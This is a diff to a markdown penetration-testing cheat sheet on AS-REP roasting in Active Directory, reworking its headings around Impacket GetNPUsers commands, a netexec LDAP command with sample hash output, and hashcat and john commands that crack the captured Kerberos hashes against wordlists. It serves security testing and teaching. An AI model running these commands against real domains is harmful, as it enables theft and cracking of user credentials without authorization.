@@ -46,7 +46,7 @@
   $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...
   ```
 ## ASREP Roast from Linux
-* [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from Impacket Suite
+### [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from Impacket Suite
 
   ```bash
   $ python GetNPUsers.py htb.local/svc-alfresco -no-pass
@@ -58,21 +58,22 @@
   root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
   ```
 
-* netexec Module
+### netexec Module
 
   ```bash
   $ netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
   LDAP        10.0.2.11       389    dc01           $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5
   ```
 
-Using `hashcat` or `john` to crack the ticket.
+## Using `hashcat` or `john` to crack the ticket.
 
-```powershell
-# crack AS_REP messages with hashcat
-root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
-root@windows:hashcat$ hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt
+```bash
+# Linux
+hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
+# Windows
+hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt
 
-# crack AS_REP messages with john
+# crack AS_REP messages with john (Windows)
 C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
 ```
 
